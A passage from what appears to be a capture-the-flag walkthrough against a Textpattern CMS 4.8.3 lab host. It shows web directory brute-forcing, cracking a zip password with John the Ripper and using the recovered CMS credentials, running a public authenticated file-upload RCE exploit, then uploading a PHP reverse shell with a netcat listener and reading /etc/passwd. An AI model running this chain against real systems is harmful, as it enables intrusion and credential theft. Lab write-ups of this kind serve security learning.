404      GET        9l       33w      309c http://192.168.189.219/textpattern/rpc/New%20Folder.zip
404      GET        9l       33w      306c http://192.168.189.219/textpattern/rpc/Site%20Assets
404      GET        9l       33w      310c http://192.168.189.219/textpattern/rpc/Site%20Assets.zip
404      GET        9l       34w      310c http://192.168.189.219/textpattern/rpc/What%20is%20New.zip
[####################] - 80s   180205/180205  0s      found:358     errors:278    
[####################] - 73s    30000/30000   412/s   http://192.168.189.219/ 
[####################] - 73s    30000/30000   410/s   http://192.168.189.219/textpattern/ 
[####################] - 1s     30000/30000   50676/s http://192.168.189.219/textpattern/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   49423/s http://192.168.189.219/textpattern/themes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   1200000/s http://192.168.189.219/textpattern/files/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 72s    30000/30000   416/s   http://192.168.189.219/textpattern/textpattern/ 
[####################] - 2s     30000/30000   15377/s http://192.168.189.219/textpattern/textpattern/lib/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   882353/s http://192.168.189.219/textpattern/textpattern/tmp/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   810811/s http://192.168.189.219/textpattern/textpattern/plugins/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   9039/s  http://192.168.189.219/textpattern/textpattern/lang/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   10256/s http://192.168.189.219/textpattern/textpattern/include/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   9852/s  http://192.168.189.219/textpattern/textpattern/admin-themes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   416667/s http://192.168.189.219/textpattern/textpattern/vendors/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 71s    30000/30000   422/s   http://192.168.189.219/textpattern/textpattern/update/ 
[####################] - 72s    30000/30000   417/s   http://192.168.189.219/textpattern/rpc/ 
[####################] - 71s    30000/30000   425/s   http://192.168.189.219/textpattern/textpattern/setup/  
```

Still not able to find anything interesting, decided to go ahead and use another tool

And truth be told, I managed to find the .zip compressed file using gobuster instead

```
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://192.168.189.219 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.189.219
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 750]
/db                   (Status: 200) [Size: 53656]
/robots               (Status: 200) [Size: 110]
/spammer              (Status: 200) [Size: 179]
/spammer.zip          (Status: 200) [Size: 179]
Progress: 83121 / 441122 (18.84%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 83434 / 441122 (18.91%)
===============================================================
Finished
===============================================================

```

![](attachments/Pasted%20image%2020250214212903.png)

For cracking a compressed file protected with a password, I chose to go with John the Ripper tool to crack the password using the rockyou dictionary

```
┌──(kali㉿kali)-[~/Downloads]
└─$ zip2john spammer.zip > spammer    
ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ cat spammer    
spammer.zip/creds.txt:$pkzip$1*1*2*0*1b*f*b003611d*0*27*0*1b*b003*2d41804a5ea9a60b1769d045bfb94c71382b2e5febf63bda08a56c*$/pkzip$:creds.txt:spammer.zip::spammer.zip
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ john spammer -w=../Desktop/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
myspace4         (spammer.zip/creds.txt)     
1g 0:00:00:00 DONE (2025-02-15 03:13) 100.0g/s 2457Kp/s 2457Kc/s 2457KC/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

I was able to obtain some kind of credentials 

![](attachments/Pasted%20image%2020250214213210.png)

Proceeding forward, I have decided to try loging to the textpattern CMS again

I was then able to login successfully using the obtain credentials previously 

![](attachments/Pasted%20image%2020250214220611.png)

I then discovered that the actual version of the textpattern CMS is 4.8.3

![](attachments/Pasted%20image%2020250214213858.png)

After searching for another exploit I managed to find one on GitHub written in Python

![](attachments/Pasted%20image%2020250214213939.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python exploit.py -t 192.168.189.219 -u mayer -p lionheart -c whoami          
Traceback (most recent call last):
  File "/home/kali/Downloads/exploit.py", line 104, in <module>
    main()
  File "/home/kali/Downloads/exploit.py", line 88, in main
    s,_txp_token = login(login_url, user, password)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Downloads/exploit.py", line 42, in login
    s.get(login_url, verify=False)
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 602, in get
    return self.request("GET", url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 575, in request
    prep = self.prepare_request(req)
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 484, in prepare_request
    p.prepare(
  File "/usr/lib/python3/dist-packages/requests/models.py", line 367, in prepare
    self.prepare_url(url, params)
  File "/usr/lib/python3/dist-packages/requests/models.py", line 438, in prepare_url
    raise MissingSchema(
requests.exceptions.MissingSchema: Invalid URL '192.168.189.219/textpattern/index.php': No scheme supplied. Perhaps you meant https://192.168.189.219/textpattern/index.php?

```

Troubleshooting the error, I went on to modify the exploit script to include the correct directory to login onto the website

![](attachments/Pasted%20image%2020250214214614.png)

After modifying the script

![](attachments/Pasted%20image%2020250214214642.png)

After another test the error was still being displayed

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python exploit.py -t 192.168.189.219 -u mayer -p lionheart -c whoami
Traceback (most recent call last):
  File "/home/kali/Downloads/exploit.py", line 104, in <module>
    main()
  File "/home/kali/Downloads/exploit.py", line 88, in main
    s,_txp_token = login(login_url, user, password)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/Downloads/exploit.py", line 42, in login
    s.get(login_url, verify=False)
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 602, in get
    return self.request("GET", url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 575, in request
    prep = self.prepare_request(req)
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 484, in prepare_request
    p.prepare(
  File "/usr/lib/python3/dist-packages/requests/models.py", line 367, in prepare
    self.prepare_url(url, params)
  File "/usr/lib/python3/dist-packages/requests/models.py", line 438, in prepare_url
    raise MissingSchema(
requests.exceptions.MissingSchema: Invalid URL '192.168.189.219/textpattern/textpattern/index.php': No scheme supplied. Perhaps you meant https://192.168.189.219/textpattern/textpattern/index.php?

```

Attempted to use a different exploit found using searchsploit

```
┌──(kali㉿kali)-[~/Downloads]
└─$ searchsploit -m php/webapps/48943.py
  Exploit: TextPattern CMS 4.8.3 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/48943
     Path: /usr/share/exploitdb/exploits/php/webapps/48943.py
    Codes: N/A
 Verified: True
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/Downloads/48943.py


                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ nano 48943.py 
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ python 48943.py                                        

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] USAGE: python3 exploit.py http://target.com username password
[*] EXAMPLE: python3 exploit.py http://localhost admin admin

                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ python 48943.py http://192.168.189.219 mayer lionheart

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] Authenticating to the target as 'mayer'
Traceback (most recent call last):
  File "/home/kali/Downloads/48943.py", line 83, in <module>
    log.success ("Logged in as '{}' (Cookie: txp_login={}; txp_login_public={})".format(username, s.cookies['txp_login'], s.cookies['txp_login_public']))
                                                                                                  ~~~~~~~~~^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/cookies.py", line 334, in __getitem__
    return self._find_no_duplicates(name)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/requests/cookies.py", line 413, in _find_no_duplicates
    raise KeyError(f"name={name!r}, domain={domain!r}, path={path!r}")
KeyError: "name='txp_login', domain=None, path=None"
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ python 48943.py http://192.168.189.219/textpattern/ mayer lionheart

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] Authenticating to the target as 'mayer'
[✓] Logged in as 'mayer' (Cookie: txp_login=mayer%2C334094ff71a044371a19f859c5e89db8; txp_login_public=9698a681acmayer)
[*] Grabbing _txp_token (required to proceed with exploitation)..
Traceback (most recent call last):
  File "/home/kali/Downloads/48943.py", line 89, in <module>
    scriptJS = soup.find_all("script")[2].string.replace("var textpattern = ", "")[:-2]
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'replace'
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ python 48943.py http://192.168.189.219/textpattern/ mayer lionheart

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] Authenticating to the target as 'mayer'
[✓] Logged in as 'mayer' (Cookie: txp_login=mayer%2Cfd74f9015c61c2b3d9e8c0b9114b1980; txp_login_public=b555a23cbcmayer)
[*] Grabbing _txp_token (required to proceed with exploitation)..
Traceback (most recent call last):
  File "/home/kali/Downloads/48943.py", line 89, in <module>
    scriptJS = soup.find_all("script")[2].string.replace("vartextpattern = ", "")[:-2]
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'replace'

```

After deciding that it is too much of a hassle to fix those broken scripts, I've went ahead and attempted to upload the file manually from the CMS page directly 

![](attachments/Pasted%20image%2020250214220648.png)

![](attachments/Pasted%20image%2020250214220342.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./
                                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ nano php-reverse-shell.php 

```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -nvlp 4444                                               
listening on [any] 4444 ...


```

![](attachments/Pasted%20image%2020250214220428.png)

Now after the reverse shell payload has been uploaded, I went on to find where it is actually located on the web server

After re-reviewing the output results from both Feroxbuster and Gobuster

![](attachments/Pasted%20image%2020250214221123.png)

And I gained a shell on the target system eventually 

![](attachments/Pasted%20image%2020250214221147.png)

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
$ ss -ntlup
Netid  State      Recv-Q Send-Q     Local Address:Port       Peer Address:Port 
tcp    LISTEN     0      50             127.0.0.1:3306                  *:*     
tcp    LISTEN     0      128                   :::80                   :::*     
tcp    LISTEN     0      20                   ::1:25                   :::*     
tcp    LISTEN     0      20             127.0.0.1:25                    *:*     
$ 

```

I noticed that there is a MySQL database running internally on port 3306 and a MySQL user as well on the /etc/passwd 

